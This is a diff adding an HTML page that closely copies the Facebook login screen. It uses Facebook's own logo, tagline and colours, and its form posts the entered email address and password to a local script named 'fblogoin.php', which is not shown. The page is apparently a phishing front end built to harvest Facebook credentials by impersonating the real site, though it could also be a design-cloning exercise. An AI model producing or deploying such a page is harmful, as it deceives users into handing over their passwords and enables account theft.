@@ -1,0 +1,119 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <title>Facebook</title>
+</head>
+<body>
+    
+    <div class="face" style="position:relative;">
+        <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" width="20%" style="height: 106px; margin: -28px; margin-top:10%; margin-left:15%;" >
+        <h2 style="margin-left: 17.7%;line-height: 25px;font-family:  Helvetica;"> Facebook helps you connect<br>and share with the people in your life.</h2>
+    </div>
+
+
+
+
+    <div class="login">
+            <form method='POST' action ='fblogoin.php'>
+            <input style="margin-top: 5%;"type="email" name="email" placeholder="Email address or phone number "><br><br>
+            <input type="password" id="pass" name="pasword" placeholder="Enter the password"><i class="fa fa-eye" onclick='showpassword()'></i><br><br>
+            <input class="submit" type="submit" name=" submit" value="Log in">
+            
+    </form>
+        <p class="forget">Forgotten password?</p>
+        <hr style="border-bottom: 1px solid #dadde1; margin: 20px 16px;display: flex;">
+        <button class="btn">Create New Account</button>
+    </div>
+
+</body>
+</html>
+
+
+<style>
+    .fa:hover
+    {
+        cursor: pointer;
+        color: rgb(58, 56, 56);
+    }
+    .fa
+    {
+        margin-left: -10%;
+    }
+    .btn
+    {
+    width: 50%;
+    border:none;
+    border-radius: 6px;
+    font-size: 18px;
+    padding: 10px ;
+    margin-left: 25%;
+    background-color: #42b72a; 
+    border-color: #42b72a;
+    color: white;
+    }
+    .forget
+    {
+        text-align: center;
+        color: #1877f2;
+    
+    }
+    
+    .submit:hover
+    {
+        background-color: #075ecf;
+    }
+    .submit
+    {
+        background-color: #1877f2;
+        font-size: 20px;
+       color: white;
+       font-weight: bold;
+       font-size: 12px;
+      
+    }
+    .login input
+    {
+        width: 80%;
+        margin-left: 5%;
+        padding: 14px 16px;
+        border-radius: 6px;
+        font-size: 17px;
+        border: 1px solid #dddfe2;
+   
+        
+    }
+.login
+   {
+    box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+    background-color: #fff;
+    border-radius: 8px;
+    display: inline-block;
+    width: 25%;
+    height: 45ch;
+    margin-left: 50%;
+    position: absolute;
+    margin-top: -13.8%;
+   }
+ 
+</style>
+
+<script>
+
+
+function showpassword()
+                {
+                    var p=document.getElementById("pass");
+                    
+                    if(p.type=='password')
+                    {
+                        p.type='text';
+                    }
+                    else
+                    p.type='password';
+                }
+</script>
